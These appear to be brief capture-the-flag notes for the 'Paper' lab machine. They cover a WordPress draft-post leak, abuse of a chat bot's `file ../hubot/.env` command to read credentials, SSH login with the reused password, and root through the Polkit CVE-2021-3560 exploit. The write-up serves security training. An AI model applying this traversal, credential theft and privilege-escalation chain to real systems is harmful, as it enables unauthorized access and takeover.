# Paper


* Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)

* http://office.paper/ -> found in nikto

```
Creed Bratton
prisonmike
nick
```

* Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts -> found with wpscan

* Using http://office.paper/?static=1 found some secret posts

* Found http://chat.office.paper/register/8qozr226AhkCHZdyY in http://office.paper/?static=1

* Found creds using bot doing `file ../hubot/.env`

```bash
<!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>
```

* Doing `ssh dwight@10.10.11.143` and using `Queenofblad3s!23` got ssh as dwight

* Using linPEAS found CVE 2021-3560

* Found https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py to exploit and get root